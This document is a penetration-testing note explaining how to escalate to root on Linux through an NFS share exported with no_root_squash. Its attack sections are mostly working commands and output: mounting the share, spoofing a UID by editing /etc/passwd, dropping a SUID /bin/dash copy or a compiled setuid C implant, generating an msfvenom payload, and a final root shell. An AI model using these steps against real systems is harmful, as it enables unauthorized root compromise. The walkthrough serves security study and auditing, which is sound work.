# Living off the Land

## 01 - Detect

Files were made with NFS that derives the user's ID. If the user is `root`, and **root squashing** is enabled, the ID will instead be set to the `nobody` user. Whatever we have enumerated the server through active fingerprint (go to [[07 - Tactics & Techniques & Procedures (TTPs) Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Enumeration/Cross Platform/File Server/NFS|NFS enumeration phase]] section to learn the practical methods) or we have compromised the Linux machine with least privileges.

Let's see the NFS configuration in the `/etc/exports`.

```
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Looks like the `/tmp` directory has `no_root_squash` enabled. Through the attacker's machine we have run as `root` and create a directory to mount point the NFS server.

## 02 - Exploit

Mount the **Network File System (NFS)** from the vulnerable Linux systme

```
userware@hackware-os:~$ sudo su
root@hackware-os:~# mkdir /mnt/nfs
root@hackware-os:~# mount -o rw,vers=2 <IP>:</directory_name> /mnt/nfs
```

### 2.1 - Spoof User ID

TODO: Fill in the missing steps when spoofing the UID.

```
root@hackware-os:~# ls -l /mnt/nfs/

root@hackware-os:~# useradd -m nfsuser -s /bin/bash

root@hackware-os:~# grep <nfs_user_UID> /etc/passwd
```

The syntax as it shows.

```
root@hackware-os:~# sed -ie 's/<current_user_UID>/<target_UID_to_spoof>/g' /etc/passwd
```

Spoof the UID.

```
root@hackware-os:~# sed -ie 's/1001/1014/g' /etc/passwd
```

Switch user account then read the file.

```
root@hackware-os:~# su nfsuser

nfsuser@hackware-os:~$ id

nfsuser@hackware-os:~$ cat /mnt/nfs/file.txt
```

### 2.2 - Copy Unix Shell Prompt

We can just copy the POSIX shell prompt (`/bin/dash`) to the target.

```
root@hackware-os:~# cp /bin/dash /mnt/nfs/implant

root@hackware-os:~# chmod +xs /mnt/nfs/implant
```

### 2.3 - Copy Implant

We can compile our binary in C language using the previous technique about taking advantage of the Cron Job to execute a SUID `/bin/bash`.

```
root@hackware-os:~# cat implant.c
int main() {
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}
root@hackware-os:~# gcc implant.c -o implant
```

We can either generate a `msfvenom` payload.

```
root@hackware-os:~# msfvenom -p linux/x86/exec cmd="/bin/bash -p" -f elf -o /mnt/nfs/implant
```

Change file permissions.

```
root@hackware-os:~# chmod +xs /mnt/nfs/implant
```

Now if we return to the compromised machine you can see it has a sticky bit of SUID that can be taken advantaged of all because of enabling the `no_root_squash` from the NFS configuration.

```
root@hackware-os:~# ls -lh /mnt/nfs/implant
-rwsr-sr-x 1 root root 16K Jan 21 20:29 /mnt/nfs/implant
```

Now if we check on the compromised target side we can see our shell that has been successfully copied via root

```
$ ls -lh /home/ubuntu/sharedfolder/
total 16K
-rwsr-sr-x 1 root root 16K Jan 22 01:29 implant
$ /home/ubuntu/sharedfolder/implant -p
# whoami
root
```

## 03 - Cleanup

```
# exit
$ whoami
user

root@hackware-os:~# rm /mnt/nfs/implant
root@hackware-os:~# umount /mnt/nfs
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Enumeration/Cross Platform/File Server/NFS|Active Fingerprinting: NFS Network Protocol]]

### Hacktricks

- [Hacktricks: NFS no_root_squash/no_all_squash misconfiguration PE](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html)